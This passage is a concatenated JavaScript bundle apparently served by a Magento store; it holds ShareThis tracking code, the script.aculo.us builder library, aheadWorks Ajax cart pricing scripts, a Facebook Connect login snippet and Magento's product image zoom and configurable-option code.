false}stLight.loadFromScript();stLight.readyRun=true;stlib.data.init();stLight.fpc=stlib.data.get("fpc","pageInfo");if(stLight.publisher==null){if(typeof(window.console)!=="undefined"){try{}catch(a){}}}stLight.setProduct(stLight.product);stlib.logger.lang="en"};stLight.log=function(a){stlib.data.resetShareData();stlib.data.setSource(stLight.getSource());stlib.data.set("url",document.location.href,"shareInfo");stlib.data.set("title",document.title,"shareInfo");stlib.data.set("counter",stLight.counter++,"shareInfo");stlib.logger.log(a)};if(window.document.readyState=="completed"){stLight.onReady()}else{if(typeof(window.addEventListener)!="undefined"){window.addEventListener("load",stLight.onReady,false)}else{if(typeof(document.addEventListener)!="undefined"){document.addEventListener("load",stLight.onReady,false)}else{if(typeof window.attachEvent!="undefined"){window.attachEvent("onload",stLight.onReady)}}}}stLight.setPublisher=function(a){stlib.data.setPublisher(a);stLight.publisher=a};stLight.setRefDomain=function(a){stlib.data.setRefDomain(a)};stLight.setProduct=function(a){this.product=a;stlib.data.set("product",a,"pageInfo")};stLight.getProduct=function(){return this.product};stLight.getSource=function(){var a="share4x";if(stWidgetVersion=="5xa"){a="share5x"}return a}}stLight.getUrlSearchParam=function(){var a=window.location.search.substring(1);return a.split("&")};stLight.getUrlQueryParams=function(a){var d={};var b=a.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(e,f,g){d[f]=g});return d};stLight.getScriptSrcParams=function(b){var a=document.getElementById(b);if(a){return stLight.getUrlQueryParams(a.src)}};stLight.setParams=function(a){if(a){if(a.refdomain){stLight.setRefDomain(a.refdomain)}if(a.publisher){stLight.setPublisher(a.publisher)}if(a.product){stLight.setProduct(a.product)}}};stLight.loadFromScript=function(){var a=stLight.getScriptSrcParams("st_insights_js");stLight.setParams(a)};stLight.loadFromWindowLocation=function(){var a=stLight.getUrlSearchParam();stLight.setParams(a)};stLight.onDomContentLoaded=function(){stLight.onReady()};stLight.domReady=function(){stLight.onReady()};st_showing=false;stLight.clickSubscribers=[];stLight.nonClickSubscribers=[];if(window.document.readyState=="completed"){stLight.domReady()}else{if(typeof(window.addEventListener)!="undefined"){window.addEventListener("load",stLight.domReady,false)}else{if(typeof(document.addEventListener)!="undefined"){document.addEventListener("load",stLight.domReady,false)}else{if(typeof window.attachEvent!="undefined"){window.attachEvent("onload",stLight.domReady)}}}}if(typeof(__st_loadLate)=="undefined"){if(typeof(window.addEventListener)!="undefined"){window.addEventListener("DOMContentLoaded",stLight.onDomContentLoaded,false)}else{if(typeof(document.addEventListener)!="undefined"){document.addEventListener("DOMContentLoaded",stLight.onDomContentLoaded,false)}}}else{if(typeof(window.addEventListener)!="undefined"){window.addEventListener("DOMContentLoaded",stLight.onDomContentLoadedLazy,false)}else{if(typeof(document.addEventListener)!="undefined"){document.addEventListener("DOMContentLoaded",stLight.onDomContentLoadedLazy,false)}}}if(document.readyState=="complete"&&stLight.readyRun==false){stLight.domReady()}var stButtons=stButtons||{};stButtons.getCount=function(d,a,e){var b=false;if(e&&e!==null){while(e.childNodes.length>=1){try{e.removeChild(e.firstChild)}catch(f){}}}ShareThisEvent.listen("on_async_buttons_load",function(){stButtons=async_buttons.stButtons;stButtons.cbQueue.push({url:d,service:a,element:e});stButtons.getCountsFromService(d,a,e)},false)};stButtons.locateElements=function(a){ShareThisEvent.listen("on_async_buttons_load",function(){async_buttons.stButtons.locateElements(a)},false)};var stWidget=stWidget||{};if(typeof(stWidget.readyRun)=="undefined"){stWidget.addEntry=function(a){ShareThisEvent.listen("on_async_buttons_load",function(){stWidget=async_buttons.stWidget;stWidget.addEntry(a)},false)}}stLight.subscribe=function(b,a){ShareThisEvent.listen("on_async_buttons_load",function(){stButtonsLib.subscribe(b,a)},false)};if(window.__sharethis__){stlib.setProduct(window.__sharethis__.product);stlib.setPublisher(window.__sharethis__.property)}var sop_pview_logged=typeof __stdos__!=="undefined"&&__stdos__!==null&&__stdos__.onscriptload;if(!sop_pview_logged&&!stlib.onscriptload&&document.URL.indexOf("edge.sharethis.com")==-1){stlib.data.init();stlib.onscriptload=true;stlib.logger.log("pview",null)}stlib.scriptLoader={loadJavascript:function(b,d){var a=stlib.scriptLoader;a.head=document.getElementsByTagName("head")[0];a.scriptSrc=b;a.script=document.createElement("script");a.script.setAttribute("type","text/javascript");a.script.setAttribute("src",a.scriptSrc);a.script.async=true;if(window.attachEvent&&document.all){a.script.onreadystatechange=function(){if(this.readyState=="complete"||this.readyState=="loaded"){d()}}}else{a.script.onload=d}a.s=document.getElementsByTagName("script")[0];a.s.parentNode.insertBefore(a.script,a.s)},loadCSS:function(b,e){_$d_();_$d1("Loading CSS: "+b);var a=stlib.scriptLoader;var d;a.head=document.getElementsByTagName("head")[0];a.cssSrc=b;a.css=document.createElement("link");a.css.setAttribute("rel","stylesheet");a.css.setAttribute("type","text/css");a.css.setAttribute("href",b);a.css.setAttribute("id",b);setTimeout(function(){e();if(!document.getElementById(b)){d=setInterval(function(){if(document.getElementById(b)){clearInterval(d);e()}},100)}},100);a.head.appendChild(a.css)}};
// script.aculo.us builder.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

var Builder = {
  NODEMAP: {
    AREA: 'map',
    CAPTION: 'table',
    COL: 'table',
    COLGROUP: 'table',
    LEGEND: 'fieldset',
    OPTGROUP: 'select',
    OPTION: 'select',
    PARAM: 'object',
    TBODY: 'table',
    TD: 'table',
    TFOOT: 'table',
    TH: 'table',
    THEAD: 'table',
    TR: 'table'
  },
  // note: For Firefox < 1.5, OPTION and OPTGROUP tags are currently broken,
  //       due to a Firefox bug
  node: function(elementName) {
    elementName = elementName.toUpperCase();

    // try innerHTML approach
    var parentTag = this.NODEMAP[elementName] || 'div';
    var parentElement = document.createElement(parentTag);
    try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
      parentElement.innerHTML = "<" + elementName + "></" + elementName + ">";
    } catch(e) {}
    var element = parentElement.firstChild || null;

    // see if browser added wrapping tags
    if(element && (element.tagName.toUpperCase() != elementName))
      element = element.getElementsByTagName(elementName)[0];

    // fallback to createElement approach
    if(!element) element = document.createElement(elementName);

    // abort if nothing could be created
    if(!element) return;

    // attributes (or text)
    if(arguments[1])
      if(this._isStringOrNumber(arguments[1]) ||
        (arguments[1] instanceof Array) ||
        arguments[1].tagName) {
          this._children(element, arguments[1]);
        } else {
          var attrs = this._attributes(arguments[1]);
          if(attrs.length) {
            try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
              parentElement.innerHTML = "<" +elementName + " " +
                attrs + "></" + elementName + ">";
            } catch(e) {}
            element = parentElement.firstChild || null;
            // workaround firefox 1.0.X bug
            if(!element) {
              element = document.createElement(elementName);
              for(attr in arguments[1])
                element[attr == 'class' ? 'className' : attr] = arguments[1][attr];
            }
            if(element.tagName.toUpperCase() != elementName)
              element = parentElement.getElementsByTagName(elementName)[0];
          }
        }

    // text, or array of children
    if(arguments[2])
      this._children(element, arguments[2]);

     return $(element);
  },
  _text: function(text) {
     return document.createTextNode(text);
  },

  ATTR_MAP: {
    'className': 'class',
    'htmlFor': 'for'
  },

  _attributes: function(attributes) {
    var attrs = [];
    for(attribute in attributes)
      attrs.push((attribute in this.ATTR_MAP ? this.ATTR_MAP[attribute] : attribute) +
          '="' + attributes[attribute].toString().escapeHTML().gsub(/"/,'&quot;') + '"');
    return attrs.join(" ");
  },
  _children: function(element, children) {
    if(children.tagName) {
      element.appendChild(children);
      return;
    }
    if(typeof children=='object') { // array can hold nodes and text
      children.flatten().each( function(e) {
        if(typeof e=='object')
          element.appendChild(e);
        else
          if(Builder._isStringOrNumber(e))
            element.appendChild(Builder._text(e));
      });
    } else
      if(Builder._isStringOrNumber(children))
        element.appendChild(Builder._text(children));
  },
  _isStringOrNumber: function(param) {
    return(typeof param=='string' || typeof param=='number');
  },
  build: function(html) {
    var element = this.node('div');
    $(element).update(html.strip());
    return element.down();
  },
  dump: function(scope) {
    if(typeof scope != 'object' && typeof scope != 'function') scope = window; //global scope

    var tags = ("A ABBR ACRONYM ADDRESS APPLET AREA B BASE BASEFONT BDO BIG BLOCKQUOTE BODY " +
      "BR BUTTON CAPTION CENTER CITE CODE COL COLGROUP DD DEL DFN DIR DIV DL DT EM FIELDSET " +
      "FONT FORM FRAME FRAMESET H1 H2 H3 H4 H5 H6 HEAD HR HTML I IFRAME IMG INPUT INS ISINDEX "+
      "KBD LABEL LEGEND LI LINK MAP MENU META NOFRAMES NOSCRIPT OBJECT OL OPTGROUP OPTION P "+
      "PARAM PRE Q S SAMP SCRIPT SELECT SMALL SPAN STRIKE STRONG STYLE SUB SUP TABLE TBODY TD "+
      "TEXTAREA TFOOT TH THEAD TITLE TR TT U UL VAR").split(/\s+/);

    tags.each( function(tag){
      scope[tag] = function() {
        return Builder.node.apply(Builder, [tag].concat($A(arguments)));
      };
    });
  }
};
/**
 * aheadWorks Co.
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://ecommerce.aheadworks.com/LICENSE-M1.txt
 *
 * @category   AW
 * @package    AW_Ajaxcartpro
 * @copyright  Copyright (c) 2009-2010 aheadWorks Co. (http://www.aheadworks.com)
 * @license    http://ecommerce.aheadworks.com/LICENSE-M1.txt
 */
 
Product.ACPconfigurable = Class.create();
Product.ACPconfigurable.prototype = {
    config : {},
    initialize : function(config){
        this.config     = config;
        this.taxConfig  = this.config.taxConfig;
        this.settings   = $$('.super-attribute-select-acp');
        this.state      = new Hash();
        this.priceTemplate = new Template(this.config.template);
        this.prices     = config.prices;

        this.settings.each(function(element){
            Event.observe(element, 'change', this.configure.bind(this))
        }.bind(this));

        // fill state
        this.settings.each(function(element){
            var attributeId = element.id.replace(/[a-z]*/, '');
            if(attributeId && this.config.attributes[attributeId]) {
                element.config = this.config.attributes[attributeId];
                element.attributeId = attributeId;
                this.state[attributeId] = false;
            }
        }.bind(this))

        // Init settings dropdown
        var childSettings = [];
        for(var i=this.settings.length-1;i>=0;i--){
            var prevSetting = this.settings[i-1] ? this.settings[i-1] : false;
            var nextSetting = this.settings[i+1] ? this.settings[i+1] : false;
            if(i==0){
                this.fillSelect(this.settings[i])
            }
            else {
                this.settings[i].disabled=true;
            }
            $(this.settings[i]).childSettings = childSettings.clone();
            $(this.settings[i]).prevSetting   = prevSetting;
            $(this.settings[i]).nextSetting   = nextSetting;
            childSettings.push(this.settings[i]);
        }

        // try retireve options from url
        var separatorIndex = window.location.href.indexOf('#');
        if (separatorIndex!=-1) {
            var paramsStr = window.location.href.substr(separatorIndex+1);
            this.values = paramsStr.toQueryParams();
            this.settings.each(function(element){
                var attributeId = element.attributeId;
                element.value = (typeof(this.values[attributeId]) == 'undefined')? '' : this.values[attributeId];
                this.configureElement(element);
            }.bind(this));
        }
    },
    fillSelect: function(element){
        var attributeId = element.id.replace(/[a-z]*/, '');
        var options = this.getAttributeOptions(attributeId);
        this.clearSelect(element);
        element.options[0] = new Option(this.config.chooseText, '');

        var prevConfig = false;
        if(element.prevSetting){
            prevConfig = element.prevSetting.options[element.prevSetting.selectedIndex];
        }

        if(options) {
            var index = 1;
            for(var i=0;i<options.length;i++){
                var allowedProducts = [];
                if(prevConfig) {
                    for(var j=0;j<options[i].products.length;j++){
                        if(prevConfig.config.allowedProducts
                            && prevConfig.config.allowedProducts.indexOf(options[i].products[j])>-1){
                            allowedProducts.push(options[i].products[j]);
                        }
                    }
                } else {
                    allowedProducts = options[i].products.clone();
                }

                if(allowedProducts.size()>0){
                    options[i].allowedProducts = allowedProducts;
                    element.options[index] = new Option(this.getOptionLabel(options[i], options[i].price), options[i].id);
                    element.options[index].config = options[i];
                    index++;
                }
            }
        }
    },
    configure: function(event){
        var element = Event.element(event);
        this.configureElement(element);
    },
    configureElement : function(element) {
        this.reloadOptionLabels(element);
        if(element.value){
            this.state[element.config.id] = element.value;
            if(element.nextSetting){
                element.nextSetting.disabled = false;
                this.fillSelect(element.nextSetting);
                this.resetChildren(element.nextSetting);
            }
        }
        else {
            this.resetChildren(element);
        }
        this.reloadPrice();
    //      Calculator.updatePrice();
    },
    getAttributeOptions: function(attributeId){
        if(this.config.attributes[attributeId]){
            return this.config.attributes[attributeId].options;
        }
    },
    clearSelect: function(element){
        for(var i=element.options.length-1;i>=0;i--){
            element.remove(i);
        }
    },
    getOptionLabel: function(option, price){
        var price = parseFloat(price);
        if (this.taxConfig.includeTax) {
            var tax = price / (100 + this.taxConfig.defaultTax) * this.taxConfig.defaultTax;
            var excl = price - tax;
            var incl = excl*(1+(this.taxConfig.currentTax/100));
        } else {
            var tax = price * (this.taxConfig.currentTax / 100);
            var excl = price;
            var incl = excl + tax;
        }

        if (this.taxConfig.showIncludeTax || this.taxConfig.showBothPrices) {
            price = incl;
        } else {
            price = excl;
        }

        var str = option.label;
        if(price){
            if (this.taxConfig.showBothPrices) {
                str+= ' ' + this.formatPrice(excl, true) + ' (' + this.formatPrice(price, true) + ' ' + this.taxConfig.inclTaxTitle + ')';
            } else {
                str+= ' ' + this.formatPrice(price, true);
            }
        }
        return str;
    },
    formatPrice: function(price, showSign){
        var str = '';
        price = parseFloat(price);
        if(showSign){
            if(price<0){
                str+= '-';
                price = -price;
            }
            else{
                str+= '+';
            }
        }

        var roundedPrice = (Math.round(price*100)/100).toString();

        if (this.prices && this.prices[roundedPrice]) {
            str+= this.prices[roundedPrice];
        }
        else {
            str+= this.priceTemplate.evaluate({
                price:price.toFixed(2)
                });
        }
        return str;
    },
    reloadPrice : function(){
        var price = 0;
        for(var i=this.settings.length-1;i>=0;i--){
            var selected = this.settings[i].options[this.settings[i].selectedIndex];
            if(selected.config){
                price += parseFloat(selected.config.price);
            }
        }

        optionsPrice.changePrice('configAcp', price);
        optionsPrice.reload();

        return price;
    },
    reloadOptionLabels: function(element){
        var selectedPrice;
        if(element.options[element.selectedIndex].config){
            selectedPrice = parseFloat(element.options[element.selectedIndex].config.price)
        }
        else{
            selectedPrice = 0;
        }
        for(var i=0;i<element.options.length;i++){
            if(element.options[i].config){
                element.options[i].text = this.getOptionLabel(element.options[i].config, element.options[i].config.price-selectedPrice);
            }
        }
    },

    resetChildren : function(element){
        if(element.childSettings) {
            for(var i=0;i<element.childSettings.length;i++){
                element.childSettings[i].selectedIndex = 0;
                element.childSettings[i].disabled = true;
                if(element.config){
                    this.state[element.config.id] = false;
                }
            }
        }
    },
    reloadOldPrice: function(){
        if ($('old-price-'+this.config.productId)) {

            var price = parseFloat(this.config.oldPrice);
            for(var i=this.settings.length-1;i>=0;i--){
                var selected = this.settings[i].options[this.settings[i].selectedIndex];
                if(selected.config){
                    price+= parseFloat(selected.config.price);
                }
            }
            if (price < 0)
                price = 0;
            price = this.formatPrice(price);

            if($('old-price-'+this.config.productId)){
                $('old-price-'+this.config.productId).innerHTML = price;
            }

        }
    }
};

Product.DownloadableAcp = Class.create();
Product.DownloadableAcp.prototype = {
    config : {},
    initialize : function(config){
        this.config = config;
        this.reloadPrice();
    },
    reloadPrice : function(){
        var price = 0;
        var configNew = this.config;
        $$('.product-downloadable-link-acp').each(function(elm){
            if (configNew[elm.value] && elm.checked) {
                price += parseFloat(configNew[elm.value]);
            }
        });
        try {
            var _displayZeroPrice = optionsPrice.displayZeroPrice;
            optionsPrice.displayZeroPrice = false;
            optionsPrice.changePrice('downloadableAcp', price);
            optionsPrice.reload();
            optionsPrice.displayZeroPrice = _displayZeroPrice;
        } catch (e) {

        }
    }
};

function validateDownloadableCallback(elmId, result) {
    var container = $('downloadable-links-list');
    if (result == 'failed') {
        container.removeClassName('validation-passed');
        container.addClassName('validation-failed');
    } else {
        container.removeClassName('validation-failed');
        container.addClassName('validation-passed');
    }
}

//<![CDATA[
window.fbAsyncInit = function() {
	FB.init({
		appId  : "221928787862249",
		status : true, // check login status
		cookie : true, // enable cookies to allow the server to access the session
		xfbml  : true,  // parse XFBML
		channelUrl : 'http://www.carncompany.com/facebook/channel/index/locale/en_US/'  // custom channel
	});
	Event.fire(window, "facebook:fbAsyncInit");
};

(function() {
	var e = document.createElement('script');
	e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
	e.async = true;
	document.getElementById('fb-root').appendChild(e);
}());


document.observe('click', function(e){
	var target = e.findElement('a[rel^=facebook-connect]') || e.findElement('button[rel^=facebook-connect]');
	if (target && target.readAttribute('rel')=='facebook-connect') {
		e.stop();
		try{
			FB.login(function(response){
				if(response.status=='connected') setLocation('http://www.carncompany.com/facebook/customer_account/connect/');
			}, {perms:"email"});
		}catch(error){}
	}
});

//]]>
decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])
var Translator = new Translate({"Credit card number doesn't match credit card type":"Credit card number does not match credit card type","Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Please use only letters (a-z or A-Z), numbers (0-9) or underscores (_) in this field, first character must be a letter."});
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
if(typeof Product=='undefined') {
    var Product = {};
}

/********************* IMAGE ZOOMER ***********************/

Product.Zoom = Class.create();
/**
 * Image zoom control
 *
 * @author      Magento Core Team <core@magentocommerce.com>
 */
Product.Zoom.prototype = {
    initialize: function(imageEl, trackEl, handleEl, zoomInEl, zoomOutEl, hintEl){
        this.containerEl = $(imageEl).parentNode;
        this.imageEl = $(imageEl);
        this.handleEl = $(handleEl);
        this.trackEl = $(trackEl);
        this.hintEl = $(hintEl);

        this.containerDim = Element.getDimensions(this.containerEl);
        this.imageDim = Element.getDimensions(this.imageEl);

        this.imageDim.ratio = this.imageDim.width/this.imageDim.height;

        this.floorZoom = 1;

        if (this.imageDim.width > this.imageDim.height) {
            this.ceilingZoom = this.imageDim.width / this.containerDim.width;
        } else {
            this.ceilingZoom = this.imageDim.height / this.containerDim.height;
        }

        if (this.imageDim.width <= this.containerDim.width
            && this.imageDim.height <= this.containerDim.height) {
            this.trackEl.up().hide();
            this.hintEl.hide();
            this.containerEl.removeClassName('product-image-zoom');
            return;
        }

        this.imageX = 0;
        this.imageY = 0;
        this.imageZoom = 1;

        this.sliderSpeed = 0;
        this.sliderAccel = 0;
        this.zoomBtnPressed = false;

        this.showFull = false;

        this.selects = document.getElementsByTagName('select');

        this.draggable = new Draggable(imageEl, {
            starteffect:false,
            reverteffect:false,
            endeffect:false,
            snap:this.contain.bind(this)
        });

        this.slider = new Control.Slider(handleEl, trackEl, {
            axis:'horizontal',
            minimum:0,
            maximum:Element.getDimensions(this.trackEl).width,
            alignX:0,
            increment:1,
            sliderValue:0,
            onSlide:this.scale.bind(this),
            onChange:this.scale.bind(this)
        });

        this.scale(0);

        Event.observe(this.imageEl, 'dblclick', this.toggleFull.bind(this));

        Event.observe($(zoomInEl), 'mousedown', this.startZoomIn.bind(this));
        Event.observe($(zoomInEl), 'mouseup', this.stopZooming.bind(this));
        Event.observe($(zoomInEl), 'mouseout', this.stopZooming.bind(this));

        Event.observe($(zoomOutEl), 'mousedown', this.startZoomOut.bind(this));
        Event.observe($(zoomOutEl), 'mouseup', this.stopZooming.bind(this));
        Event.observe($(zoomOutEl), 'mouseout', this.stopZooming.bind(this));
    },

    toggleFull: function () {
        this.showFull = !this.showFull;

        //Hide selects for IE6 only
        if (typeof document.body.style.maxHeight == "undefined")  {
            for (i=0; i<this.selects.length; i++) {
                this.selects[i].style.visibility = this.showFull ? 'hidden' : 'visible';
            }
        }
        val_scale = !this.showFull ? this.slider.value : 1;
        this.scale(val_scale);

        this.trackEl.style.visibility = this.showFull ? 'hidden' : 'visible';
        this.containerEl.style.overflow = this.showFull ? 'visible' : 'hidden';
        this.containerEl.style.zIndex = this.showFull ? '1000' : '9';

        return this;
    },

    scale: function (v) {
        var centerX  = (this.containerDim.width*(1-this.imageZoom)/2-this.imageX)/this.imageZoom;
        var centerY  = (this.containerDim.height*(1-this.imageZoom)/2-this.imageY)/this.imageZoom;
        var overSize = (this.imageDim.width > this.containerDim.width && this.imageDim.height > this.containerDim.height);

        this.imageZoom = this.floorZoom+(v*(this.ceilingZoom-this.floorZoom));

        if (overSize) {
            if (this.imageDim.width > this.containerDim.width) {
                this.imageEl.style.width = (this.imageZoom*this.containerDim.width)+'px';
            }

            if(this.containerDim.ratio){
                this.imageEl.style.height = (this.imageZoom*this.containerDim.width*this.containerDim.ratio)+'px'; // for safari
            }
        } else {
            this.slider.setDisabled();
        }

        this.imageX = this.containerDim.width*(1-this.imageZoom)/2-centerX*this.imageZoom;
        this.imageY = this.containerDim.height*(1-this.imageZoom)/2-centerY*this.imageZoom;

        this.contain(this.imageX, this.imageY, this.draggable);

        return true;
    },

    startZoomIn: function()
    {
        if (!this.slider.disabled) {
            this.zoomBtnPressed = true;
            this.sliderAccel = .002;
            this.periodicalZoom();
            this.zoomer = new PeriodicalExecuter(this.periodicalZoom.bind(this), .05);
        }
        return this;
    },

    startZoomOut: function()
    {
        if (!this.slider.disabled) {
            this.zoomBtnPressed = true;
            this.sliderAccel = -.002;
            this.periodicalZoom();
            this.zoomer = new PeriodicalExecuter(this.periodicalZoom.bind(this), .05);
        }
        return this;
    },

    stopZooming: function()
    {
        if (!this.zoomer || this.sliderSpeed==0) {
            return;
        }
        this.zoomBtnPressed = false;
        this.sliderAccel = 0;
    },

    periodicalZoom: function()
    {
        if (!this.zoomer) {
            return this;
        }

        if (this.zoomBtnPressed) {
            this.sliderSpeed += this.sliderAccel;
        } else {
            this.sliderSpeed /= 1.5;
            if (Math.abs(this.sliderSpeed)<.001) {
                this.sliderSpeed = 0;
                this.zoomer.stop();
                this.zoomer = null;
            }
        }
        this.slider.value += this.sliderSpeed;

        this.slider.setValue(this.slider.value);
        this.scale(this.slider.value);

        return this;
    },

    contain: function (x,y,draggable) {

        var dim = Element.getDimensions(draggable.element);

        var xMin = 0, xMax = this.containerDim.width-dim.width;
        var yMin = 0, yMax = this.containerDim.height-dim.height;

        x = x>xMin ? xMin : x;
        x = x<xMax ? xMax : x;
        y = y>yMin ? yMin : y;
        y = y<yMax ? yMax : y;

        if (this.containerDim.width > dim.width) {
            x = (this.containerDim.width/2) - (dim.width/2);
        }

        if (this.containerDim.height > dim.height) {
            y = (this.containerDim.height/2) - (dim.height/2);
        }

        this.imageX = x;
        this.imageY = y;

        this.imageEl.style.left = this.imageX+'px';
        this.imageEl.style.top = this.imageY+'px';

        return [x,y];
    }
}

/**************************** CONFIGURABLE PRODUCT **************************/
Product.Config = Class.create();
Product.Config.prototype = {
    initialize: function(config){
        this.config     = config;
        this.taxConfig  = this.config.taxConfig;
        this.settings   = $$('.super-attribute-select');
        this.state      = new Hash();
        this.priceTemplate = new Template(this.config.template);
        this.prices     = config.prices;

        this.settings.each(function(element){
            Event.observe(element, 'change', this.configure.bind(this))
        }.bind(this));

        // fill state
        this.settings.each(function(element){
            var attributeId = element.id.replace(/[a-z]*/, '');
            if(attributeId && this.config.attributes[attributeId]) {
                element.config = this.config.attributes[attributeId];
                element.attributeId = attributeId;
                this.state[attributeId] = false;
            }
        }.bind(this))

        // Init settings dropdown
        var childSettings = [];
        for(var i=this.settings.length-1;i>=0;i--){
            var prevSetting = this.settings[i-1] ? this.settings[i-1] : false;
            var nextSetting = this.settings[i+1] ? this.settings[i+1] : false;
            if(i==0){
                this.fillSelect(this.settings[i])
            }
            else {
                this.settings[i].disabled=true;
            }
            $(this.settings[i]).childSettings = childSettings.clone();
            $(this.settings[i]).prevSetting   = prevSetting;
            $(this.settings[i]).nextSetting   = nextSetting;
            childSettings.push(this.settings[i]);
        }

        // try retireve options from url
        var separatorIndex = window.location.href.indexOf('#');
        if (separatorIndex!=-1) {
            var paramsStr = window.location.href.substr(separatorIndex+1);
            this.values = paramsStr.toQueryParams();
            this.settings.each(function(element){
                var attributeId = element.attributeId;
                element.value = (typeof(this.values[attributeId]) == 'undefined')? '' : this.values[attributeId];
                this.configureElement(element);
            }.bind(this));
        }
    },

    configure: function(event){
        var element = Event.element(event);
        this.configureElement(element);
    },

    configureElement : function(element) {
        this.reloadOptionLabels(element);
        if(element.value){
            this.state[element.config.id] = element.value;
            if(element.nextSetting){
                element.nextSetting.disabled = false;
                this.fillSelect(element.nextSetting);
                this.resetChildren(element.nextSetting);
            }
        }
        else {
            this.resetChildren(element);
        }
        this.reloadPrice();
//      Calculator.updatePrice();
    },

    reloadOptionLabels: function(element){
        var selectedPrice;
        if(element.options[element.selectedIndex].config){
            selectedPrice = parseFloat(element.options[element.selectedIndex].config.price)
        }
        else{
            selectedPrice = 0;
        }
        for(var i=0;i<element.options.length;i++){
            if(element.options[i].config){
                element.options[i].text = this.getOptionLabel(element.options[i].config, element.options[i].config.price-selectedPrice);
            }
        }
    },

    resetChildren : function(element){
        if(element.childSettings) {
            for(var i=0;i<element.childSettings.length;i++){
                element.childSettings[i].selectedIndex = 0;
                element.childSettings[i].disabled = true;
                if(element.config){
                    this.state[element.config.id] = false;
                }
            }
        }
    },

    fillSelect: function(element){
        var attributeId = element.id.replace(/[a-z]*/, '');
        var options = this.getAttributeOptions(attributeId);
        this.clearSelect(element);
        element.options[0] = new Option(this.config.chooseText, '');

        var prevConfig = false;
        if(element.prevSetting){
            prevConfig = element.prevSetting.options[element.prevSetting.selectedIndex];
        }

        if(options) {
            var index = 1;
            for(var i=0;i<options.length;i++){
                var allowedProducts = [];
                if(prevConfig) {
                    for(var j=0;j<options[i].products.length;j++){
                        if(prevConfig.config.allowedProducts
                            && prevConfig.config.allowedProducts.indexOf(options[i].products[j])>-1){
                            allowedProducts.push(options[i].products[j]);
                        }
                    }
                } else {
                    allowedProducts = options[i].products.clone();
                }

                if(allowedProducts.size()>0){
                    options[i].allowedProducts = allowedProducts;
                    element.options[index] = new Option(this.getOptionLabel(options[i], options[i].price), options[i].id);
                    element.options[index].config = options[i];
                    index++;
                }
            }
        }
    },

    getOptionLabel: function(option, price){
        var price = parseFloat(price);
        if (this.taxConfig.includeTax) {
            var tax = price / (100 + this.taxConfig.defaultTax) * this.taxConfig.defaultTax;
            var excl = price - tax;
            var incl = excl*(1+(this.taxConfig.currentTax/100));
        } else {
            var tax = price * (this.taxConfig.currentTax / 100);
            var excl = price;
            var incl = excl + tax;
        }

        if (this.taxConfig.showIncludeTax || this.taxConfig.showBothPrices) {
            price = incl;
        } else {
            price = excl;
        }

        var str = option.label;
        if(price){
            if (this.taxConfig.showBothPrices) {
                str+= ' ' + this.formatPrice(excl, true) + ' (' + this.formatPrice(price, true) + ' ' + this.taxConfig.inclTaxTitle + ')';
            } else {
                str+= ' ' + this.formatPrice(price, true);
            }
        }
        return str;
    },

    formatPrice: function(price, showSign){
        var str = '';
        price = parseFloat(price);
        if(showSign){
            if(price<0){
                str+= '-';
                price = -price;
            }
            else{
                str+= '+';
            }
        }

        var roundedPrice = (Math.round(price*100)/100).toString();

        if (this.prices && this.prices[roundedPrice]) {
            str+= this.prices[roundedPrice];
        }
        else {
            str+= this.priceTemplate.evaluate({price:price.toFixed(2)});
        }
        return str;
    },

    clearSelect: function(element){
        for(var i=element.options.length-1;i>=0;i--){
            element.remove(i);
        }
    },

    getAttributeOptions: function(attributeId){
        if(this.config.attributes[attributeId]){
            return this.config.attributes[attributeId].options;
        }
    },

    reloadPrice: function(){
        var price = 0;
        for(var i=this.settings.length-1;i>=0;i--){
            var selected = this.settings[i].options[this.settings[i].selectedIndex];
            if(selected.config){
                price += parseFloat(selected.config.price);
            }
        }

        optionsPrice.changePrice('config', price);
        optionsPrice.reload();

        return price;

        if($('product-price-'+this.config.productId)){
            $('product-price-'+this.config.productId).innerHTML = price;
        }
        this.reloadOldPrice();
    },

    reloadOldPrice: function(){
        if ($('old-price-'+this.config.productId)) {

            var price = parseFloat(this.config.oldPrice);
            for(var i=this.settings.length-1;i>=0;i--){
                var selected = this.settings[i].options[this.settings[i].selectedIndex];
                if(selected.config){
                    price+= parseFloat(selected.config.price);
                }
            }
            if (price < 0)
                price = 0;
            price = this.formatPrice(price);

            if($('old-price-'+this.config.productId)){
                $('old-price-'+this.config.productId).innerHTML = price;
            }

        }
    }
}


/**************************** SUPER PRODUCTS ********************************/

Product.Super = {};
Product.Super.Configurable = Class.create();

Product.Super.Configurable.prototype = {
    initialize: function(container, observeCss, updateUrl, updatePriceUrl, priceContainerId) {
        this.container = $(container);
        this.observeCss = observeCss;
        this.updateUrl = updateUrl;
        this.updatePriceUrl = updatePriceUrl;
        this.priceContainerId = priceContainerId;
        this.registerObservers();
    },
    registerObservers: function() {
        var elements = this.container.getElementsByClassName(this.observeCss);
        elements.each(function(element){
            Event.observe(element, 'change', this.update.bindAsEventListener(this));
        }.bind(this));
        return this;
    },
    update: function(event) {
        var elements = this.container.getElementsByClassName(this.observeCss);
        var parameters = Form.serializeElements(elements, true);

        new Ajax.Updater(this.container, this.updateUrl + '?ajax=1', {
                parameters:parameters,
                onComplete:this.registerObservers.bind(this)
        });
